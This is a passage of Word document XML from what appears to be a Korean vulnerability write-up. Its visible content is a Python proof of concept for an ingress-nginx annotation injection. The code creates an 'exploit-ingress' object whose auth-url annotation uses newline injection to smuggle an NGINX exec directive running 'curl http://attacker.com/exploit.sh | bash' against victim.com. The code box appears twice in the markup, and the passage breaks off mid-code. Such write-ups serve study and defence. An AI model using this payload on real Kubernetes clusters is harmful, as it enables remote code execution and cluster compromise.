        </w:rPr>
        <w:t xml:space="preserve">PoC </w:t>
      </w:r>
      <w:r w:rsidR="00F9143F" w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>코드</w:t>
      </w:r>
      <w:r w:rsidR="00F9143F" w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Python)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="43C271C0" wp14:editId="6AA15931">
                <wp:extent cx="5324475" cy="6953693"/>
                <wp:effectExtent l="0" t="0" r="28575" b="19050"/>
                <wp:docPr id="169843878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6953693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085CC" w14:textId="20527A08" w:rsidR="001D6E9D" w:rsidRPr="001D6E9D" w:rsidRDefault="0071623C" w:rsidP="001D6E9D">
                            <w:pPr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python</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0677E4AC" w14:textId="6001E9D5" w:rsidR="0071623C" w:rsidRPr="0071623C" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                            <w:pP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</w:pPr>
                            <w:r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="7030A0"/>
                                <w:lang w:eastAsia="ko-KR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kubernetes.client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r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="7030A0"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>from</w:t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kubernetes</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="7030A0"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>import</w:t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config</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="595A10C7" w14:textId="42E7A353" w:rsidR="0071623C" w:rsidRPr="0071623C" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                            <w:pP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</w:pPr>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"># </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>쿠버네티스</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>구성</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>파일</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>로드</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>공격자</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E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8E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>머신의</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> ~</w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>/.</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>kube</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve">/config </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>사용</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E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config.load</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/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_kube_config</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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() </w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="68F6841A" w14:textId="77777777" w:rsidR="0071623C" w:rsidRPr="0071623C" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                            <w:pP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</w:pPr>
                            <w:proofErr w:type="spellStart"/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api</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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= </w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/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kubernetes.client</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/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.NetworkingV1</w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/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Api(</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/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)</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6A0F3BD4" w14:textId="039D1382" w:rsidR="001D6E9D" w:rsidRPr="001D6E9D" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                            <w:pP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</w:pPr>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"># </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>악성</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> Ingress </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>객체</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>정의</w:t>
                            </w:r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body = {</w:t>
                            </w:r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r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve">    "</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>apiVersion</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"</w:t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: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"networking.k8s.io/v1",</w:t>
                            </w:r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r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve">    "kind"</w:t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: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"Ingress"</w:t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,</w:t>
                            </w:r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   </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"metadata"</w:t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: {</w:t>
                            </w:r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       </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"name"</w:t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: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"exploit-ingress"</w:t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,</w:t>
                            </w:r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       </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"annotations"</w:t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: {</w:t>
                            </w:r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           </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"nginx.ingress.kubernetes.io/auth-</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>url</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"</w:t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: </w:t>
                            </w:r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r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve">                # </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>개행</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>문자</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>(\n)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>로</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> NGINX directive </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>분리</w:t>
                            </w:r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               </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>http://legit.com/;#\\n    exec /bin/</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>sh</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> -c 'curl</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>http://attacker.com/exploit.sh | bash</w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>';\\n</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/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       }</w:t>
                            </w:r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 </w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/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 }</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/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,</w:t>
                            </w:r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   </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"spec"</w:t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: {</w:t>
                            </w:r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       </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"rules"</w:t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: [{</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"host"</w:t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: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"victim.com"</w:t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, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"http"</w:t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: {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"paths"</w:t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: [{</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"path"</w:t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: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"/"</w:t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}]}}]</w:t>
                            </w:r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   }</w:t>
                            </w:r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C271C0" id="_x0000_s1030" style="width:419.25pt;height:54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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="64F085CC" w14:textId="20527A08" w:rsidR="001D6E9D" w:rsidRPr="001D6E9D" w:rsidRDefault="0071623C" w:rsidP="001D6E9D">
                      <w:pPr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python</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0677E4AC" w14:textId="6001E9D5" w:rsidR="0071623C" w:rsidRPr="0071623C" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="7030A0"/>
                          <w:lang w:eastAsia="ko-KR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>kubernetes.client</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:proofErr w:type="gramEnd"/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r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="7030A0"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>from</w:t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</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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>kubernetes</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="7030A0"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>import</w:t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config</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="595A10C7" w14:textId="42E7A353" w:rsidR="0071623C" w:rsidRPr="0071623C" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"># </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>쿠버네티스</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>구성</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>파일</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>로드</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>공격자</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>머신의</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> ~</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>/.</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>kube</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve">/config </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>사용</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/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>config.load</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/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>_kube_config</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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() </w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="68F6841A" w14:textId="77777777" w:rsidR="0071623C" w:rsidRPr="0071623C" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/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>api</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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= </w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/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>kubernetes.client</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/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>.NetworkingV1</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/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>Api(</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/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>)</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6A0F3BD4" w14:textId="039D1382" w:rsidR="001D6E9D" w:rsidRPr="001D6E9D" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"># </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>악성</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> Ingress </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>객체</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>정의</w:t>
                      </w:r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>body = {</w:t>
                      </w:r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r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve">    "</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>apiVersion</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"</w:t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: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"networking.k8s.io/v1",</w:t>
